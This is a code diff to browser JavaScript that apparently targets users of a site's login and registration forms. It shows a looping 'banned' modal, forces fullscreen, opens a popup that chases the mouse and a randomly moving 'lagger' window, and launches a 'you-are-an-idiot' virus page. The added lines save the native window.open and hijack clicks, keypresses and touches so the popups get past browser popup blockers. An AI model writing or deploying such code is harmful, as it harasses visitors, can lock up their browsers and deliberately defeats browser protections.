@@ -7,6 +7,7 @@
   var LAGGER_URL = BASE + '/tools/lagger/index.html';
   var VIRUS_URL = BASE + '/you-are-an-idiot/virus.html';
   var _triggered = false;
+  var _nativeOpen = window.open.bind(window);
 
   var AUTH_FIELDS = 'input[name="login_identifier"],input[name="reg_username"],input[name="email"],input[name="forgot_identifier"]';
 
@@ -72,14 +73,30 @@
     setTimeout(runBan, 4000);
   }
 
+  var GESTURE_EVENTS = ['click','keydown','mousedown','touchstart','pointerdown'];
+
+  function onGesture(fn) {
+    function handler() {
+      GESTURE_EVENTS.forEach(function(ev) { document.removeEventListener(ev, handler, true); });
+      fn();
+    }
+    GESTURE_EVENTS.forEach(function(ev) { document.addEventListener(ev, handler, { capture: true }); });
+  }
+
   function runBan() {
     loadFont(); injectKeyframes(); makeModal();
     setInterval(makeModal, 400);
-    setTimeout(stage3, 2000);
+    var ready = false;
+    setTimeout(function() { ready = true; }, 2000);
+    function tryStage3() {
+      if (!ready) { onGesture(tryStage3); return; }
+      stage3();
+    }
+    onGesture(tryStage3);
   }
 
   function stage3() {
-    var popup = window.open('', '_blank', 'width=600,height=400');
+    var popup = _nativeOpen('', '_blank', 'width=600,height=400');
     if (!popup) return;
     popup.document.write('<!DOCTYPE html><html><head><meta charset="utf-8"><link href="https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0}body{background:#000;overflow:hidden}.c{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}h1{font-family:"Zilla Slab Highlight",serif;font-size:8vw;color:#ff1a1a;text-shadow:0 0 60px rgba(255,0,0,.7);animation:p .12s infinite alternate}@keyframes p{0%{transform:scale(1)}100%{transform:scale(1.03)}}button{margin-top:40px;padding:16px 48px;font-size:2vw;background:#ff1a1a;color:#fff;border:none;cursor:pointer;font-family:"Zilla Slab Highlight",serif;border-radius:8px}</style></head><body><div class="c"><h1>YOU ARE BANNED FROM SERVICE</h1><button id="cl">CLOSE</button></div><script>');
     popup.document.write('function goFS(){try{document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen();}catch(e){}}');
@@ -95,15 +112,26 @@
   }
 
   function stage4(existingPopup) {
-    var laggerPopup = window.open(LAGGER_URL, '_blank', 'width=500,height=400');
+    var laggerPopup = null;
     var mouseX = screen.width / 2, mouseY = screen.height / 2;
     document.addEventListener('mousemove', function(e) { mouseX = e.screenX; mouseY = e.screenY; });
+
+    onGesture(function() {
+      laggerPopup = _nativeOpen(LAGGER_URL, '_blank', 'width=500,height=400');
+    });
+
     setInterval(function() { try { if (existingPopup && !existingPopup.closed) existingPopup.moveTo(mouseX - 200, mouseY - 150); } catch(e) {} }, 30);
     setInterval(function() { try { if (laggerPopup && !laggerPopup.closed) laggerPopup.moveTo(Math.random() * (screen.width - 400), Math.random() * (screen.height - 300)); } catch(e) {} }, 150);
+
     var virusFired = false;
-    function fireVirus() { if (virusFired) return; virusFired = true; window.open(VIRUS_URL, '_blank', 'width=600,height=400'); }
+    function fireVirus() {
+      if (virusFired) return;
+      if (!laggerPopup) return;
+      virusFired = true;
+      _nativeOpen(VIRUS_URL, '_blank', 'width=600,height=400');
+    }
     ['click','keydown','mousedown','touchstart','pointerdown','scroll'].forEach(function(ev) {
-      document.addEventListener(ev, fireVirus, { once: true, capture: true });
+      document.addEventListener(ev, fireVirus, { capture: true });
     });
   }
 
